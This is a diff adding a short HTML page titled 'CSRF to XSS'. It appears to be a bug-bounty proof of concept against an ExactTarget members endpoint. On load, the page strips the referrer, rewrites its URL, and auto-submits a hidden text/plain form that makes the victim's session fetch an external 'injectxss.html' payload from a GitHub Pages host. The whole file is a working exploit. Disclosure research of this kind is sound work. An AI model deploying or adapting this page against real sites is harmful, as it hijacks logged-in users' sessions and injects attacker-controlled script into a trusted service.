@@ -1,0 +1,37 @@
+<html>
+
+<h1>CSRF to XSS</h1>
+
+<script>
+
+var meta = document.createElement('meta');
+
+meta.name = "referrer";
+
+meta.content = "no-referrer";
+
+document.getElementsByTagName('head')[0].appendChild(meta);
+
+</script>
+
+<body>
+
+<form action="https://members.s8.exacttarget.com/Content/Async/ContentAjax.aspx?09%3A56%3A37%20GMT-0400%20%28Eastern%20Daylight%20Time%29" method="POST" enctype="text/plain">
+
+<input type="hidden" name="&lt;params&gt;&lt;action&gt;GetExternalContent&lt;/action&gt;&lt;url&gt;https://jithendrarenati.github.io/securitybugfiles/injectxss.html&lt;/url&gt;&lt;/params&gt;" value="&#13;&#10;" />
+
+<input type="submit" value="Submit request" />
+
+</form>
+
+<script>
+
+history.pushState('', '', '/');
+
+document.forms[0].submit();
+
+</script>
+
+</body>
+
+</html>
